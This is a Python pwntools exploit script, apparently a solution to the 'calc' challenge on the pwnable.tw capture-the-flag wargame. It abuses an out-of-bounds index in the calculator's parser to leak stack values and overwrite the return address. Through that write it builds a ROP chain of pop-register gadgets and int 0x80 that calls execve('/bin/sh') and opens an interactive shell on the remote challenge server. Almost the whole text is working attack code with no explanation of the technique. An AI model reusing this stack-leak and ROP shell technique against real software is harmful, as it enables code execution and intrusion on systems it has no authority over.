from os import lseek
from pwn import *
import sys

p_name = "./calc"

def get_stack_info(p):

    stack_value = []
    for i in range(10):
        payload = "*" + str(360 + 1 + i) + "\n"
        p.send(payload)

        rec = p.recv(numb=4096)
        if(rec == b'\n'):
            rec = p.recv(numb=4096)

        ebp_addr = int(rec, 10)
        stack_value.append(ebp_addr)
        print("ebp + "+ hex(i) + ":"+hex(ebp_addr & 0xffffffff))
    return stack_value

def edit_stack_value(p, index, value, sym):
    if(sym == "+"):
        if(value >= 0):
            payload = "*" + str(index) + "+" + str(value) + "\n"
        else:
            payload =  "*" + str(index) + str(value) + "\n"
    elif(sym == "-"):
        payload = "*" + str(index) + "-" + str(value) + "\n"
    p.send(payload)

    rec = p.recv(numb=4096)
    if(rec == b'\n'):
        rec = p.recv(numb=4096)


def main():
    ''',log_level='debug'''
    context(arch = "i386", os = "linux" )

    #p = process(p_name)
    p = remote("chall.pwnable.tw", 10100)
    #gdb.attach(p)

    popeax = 0x0805c34b

    #FFD2CCE8  FFD2CD08
    #popebx = 0x080481d1
    popedxecxebx = 0x080701d0

    int80 = 0x08049a21

    elf = ELF(p_name)

    p.recvuntil("=== Welcome to SECPROG calculator ===")

    stack_value = get_stack_info(p)
    edit_stack_value(p, 362, popeax - stack_value[1], "+") #eip
    stack_value = get_stack_info(p)
    edit_stack_value(p, 363, stack_value[2] - 11, "-") #eax
    stack_value = get_stack_info(p)
    edit_stack_value(p, 364, popedxecxebx - stack_value[3], "+") #edx ecx ebx
    stack_value = get_stack_info(p)
    edit_stack_value(p, 365, stack_value[4], "-") #edx
    stack_value = get_stack_info(p)
    edit_stack_value(p, 366, stack_value[5], "-") #ecx
    stack_value = get_stack_info(p)
    
    ebp_value_add = stack_value[0] & 0xfffffff0 - 0x10 - 4 - 4

    ebp_value_add -= 2**32

    x = ebp_value_add + 8 * 4 - stack_value[6]

    edit_stack_value(p, 367, x, "+") #ebx
    stack_value = get_stack_info(p)
    edit_stack_value(p, 368, int80 - stack_value[7], "+")
    stack_value = get_stack_info(p)
    bin = u32('/bin')
    sh = u32('/sh\0')
    edit_stack_value(p, 369, bin - stack_value[8], "+")
    stack_value = get_stack_info(p)
    edit_stack_value(p, 370, stack_value[9] - sh, "-")
    p.sendline()
    p.interactive()


main()

# get ebp_address



#p.interactive()